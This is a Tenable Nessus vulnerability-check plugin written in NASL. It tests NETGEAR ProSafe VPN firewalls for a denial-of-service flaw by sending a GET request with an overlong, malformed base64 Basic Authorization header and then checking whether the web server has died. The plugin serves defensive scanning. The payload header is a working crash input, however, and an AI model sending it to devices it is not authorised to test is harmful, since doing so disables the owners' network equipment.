#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(11474);
  script_version ("$Revision: 1.16 $");
  script_bugtraq_id(7166);
  script_osvdb_id(55304);

  script_name(english:"NETGEAR ProSafe VPN Firewall Web Server Malformed Basic Authorization Header Remote DoS");
  script_summary(english:"Attempts to crash the firewall via a long Basic Authorization string.");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is subject to an buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"It was possible to crash the remote Web server (possibly the NETGEAR
ProSafe VPN Web interface) by supplying a long malformed username and
password. 

An attacker may use this flaw to disable the remote service."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Reconfigure the device to disable remote management, contact the vendor for a patch."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/25");
 script_cvs_date("$Date: 2011/03/14 21:48:08 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www",80);
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 1);
if (http_is_dead(port: port))exit(0);

w = http_send_recv3(method:"GET", item: "/", port: port, 
  add_headers: make_array("Authorization", "Basic NzA5NzA5NzIzMDk4NDcyMDkzODQ3MjgzOXVqc2tzb2RwY2tmMHdlOW9renhjazkwenhjcHp4Yzo3MDk3MDk3MjMwOTg0NzIwOTM4NDcyODM5dWpza3NvZHBja2Ywd2U5b2t6eGNrOTB6eGNwenhj") );


if (http_is_dead(port: port, retry: 3)) security_warning(port);

